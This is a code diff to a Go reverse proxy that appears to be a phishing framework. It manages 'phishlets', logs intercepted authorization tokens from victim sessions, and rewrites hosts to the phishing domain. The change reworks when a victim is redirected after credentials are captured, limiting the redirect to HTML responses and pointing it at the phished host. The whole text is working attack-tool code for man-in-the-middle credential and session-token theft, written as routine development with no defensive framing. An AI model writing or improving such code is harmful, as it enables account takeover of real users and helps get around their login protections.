@@ -247,7 +247,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// replace "Host" header
 				e_host := req.Host
-				orig_host := strings.ToLower(req.Host)
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -433,21 +432,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				req.Header.Set(string(e), e_host)
 
-				if ps.SessionId != "" && origin == "" {
-					s, ok := p.sessions[ps.SessionId]
-					if ok {
-						if s.IsDone && s.RedirectURL != "" && p.handleSession(orig_host) && s.RedirectCount == 0 {
-							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
-							resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-							if resp != nil {
-								resp.Header.Add("Location", s.RedirectURL)
-								return req, resp
-							}
-						}
-					}
-				}
-
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
 					if ok && !s.IsDone {
@@ -583,8 +567,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
-				mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters
@@ -699,16 +683,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
-							if s.IsDone && s.RedirectURL != "" && p.handleSession(req_hostname) && s.RedirectCount == 0 {
-								s.RedirectCount += 1
-								log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
-								resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
-								if resp != nil {
-									resp.Header.Add("Location", s.RedirectURL)
-									return resp
-								}
-							}
 							break
+						}
+					}
+				}
+			}
+
+			if pl != nil && ps.SessionId != "" {
+				s, ok := p.sessions[ps.SessionId]
+				if ok && s.IsDone {
+					if s.RedirectURL != "" && s.RedirectCount == 0 {
+						if stringExists(mime, []string{"text/html"}) {
+							// redirect only if received response content is of `text/html` content type
+							s.RedirectCount += 1
+							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
+							if resp != nil {
+								r_url, err := url.Parse(s.RedirectURL)
+								if err == nil {
+									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+										r_url.Host = r_host
+									}
+									resp.Header.Set("Location", r_url.String())
+								} else {
+									resp.Header.Set("Location", s.RedirectURL)
+								}
+								return resp
+							}
 						}
 					}
 				}
